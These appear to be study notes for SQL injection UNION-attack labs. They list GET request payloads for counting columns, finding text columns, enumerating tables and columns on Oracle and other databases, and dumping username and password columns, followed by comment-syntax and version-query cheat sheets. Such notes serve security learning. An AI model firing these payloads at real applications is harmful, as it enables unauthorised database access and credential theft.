### 1. SQL Injection UNION attack, determining the no of column

- __normal get request__
  - __`GET /filter?catergory=Gifts`__

- __check whether sql injection present or not__
  - __`GET /filter?catergory=Gifts'`__

- __Use UNION__
  - __`GET /filter?catergory=Gifts'+UNION+SELECT+NULL--`__
  - __If still is show the same error that means there is more than one column__
  - __Try to add more NULL__
  - __`GET /filter?catergory=Gifts'+UNION+SELECT+NULL,NULL,NULL--`__



### 2. SQL Injection UNION attak, finding a column containing text

- __normal get request__
  - __`GET /filter?catergory=Pets`__


- __check whether sql injection present or not__
  - __`GET /filter?catergory=Pets'`__


- __Use UNION__
  - __`GET /filter?catergory=Pets'+UNION+SELECT+NULL--`__
  - __If still is show the same error that means there is more than one column__
  - __Try to add more NULL__
  - __`GET /filter?catergory=Gifts'+UNION+SELECT+NULL,NULL,NULL--`__

- __Now you found there are three column__
  - __so now you need to find which of the column have string__
  - __`GET /filter?catergory=Gifts'+UNION+SELECT+'admin',NULL,NULL--`__
  - __If you are getting error then the column is not a string then go and test for the remaining colums__
  - > __Note: what string you are replacing by NULL the string definetly should be present in the column__


### 3. SQL Injection UNION Attack, retrieving multiple values in a single column

- __normal get request__
  - __`GET /filter?catergory=Pets`__


- __check whether sql injection present or not__
  - __`GET /filter?catergory=Pets'UNION+SELECT+NULL,NULL,username||'~'||password+FROM+users--`__




## non-Oracle databases

- __'+UNION+SELECT+NULL,NULL--__

- __Checking if any of them holds string data__
  - __`'+UNION+SELECT+'abc','def'--`__
  - __If the abc and def reflect in the page means the two columns hold string__


- __Getting the table name__
  - __`'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--`__

- __Extracting the column names from a table(users_kwechv)__
  - __`'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_kwechv'--`__


- __Extracting the data from the two columns (1.username_ygmrlj, 2.password_jiuphc) from table(users_kwechv)__
  - __`'+UNION+SELECT+username_ygmrlj,+password_jiuphc+FROM+users_kwechv--`__



## Oracle databases

- __`'+UNION+SELECT+NULL,NULL--`__

- __Checking if any of them holds string data__
  - __`'+UNION+SELECT+'abc','def'+FROM+dual--`__
  - __If the abc and def reflect in the page means the two columns hold string__


- __Getting the table name__
  - __`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`__

- __Extracting the column names from a table(USERS_RDINGX)__
  - __`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_RDINGX'--`__


- __Extracting the data from the two columns (1.username_ygmrlj, 2.password_jiuphc) from table(USERS_RDINGX)__
  - __`'+UNION+SELECT+username_ygmrlj,+password_jiuphc+FROM+USERS_RDINGX--`__


# Types of database

- __1. Oracle__
- __2. Microsft__
- __3. PostgreSQL__
- __4. MySQL__


### Database comments
- __1. Oracle      | `--comment`__
- __2. Microsft    | `--comment or /*comment*/`__
- __3. PostgreSQL  | `--comment or /*comment*/`__
- __4. MySQL       | `#comment or -- comment or /*comment*/`__


### Database version
- __1. Oracle      | `SELECT banner FROM v$version or SELECT version FROM v$instance`__
- __2. Microsft    | `SELECT @@version`__
- __3. PostgreSQL  | `SELECT version()`__
- __4. MySQL       | `SELECT @@version`__











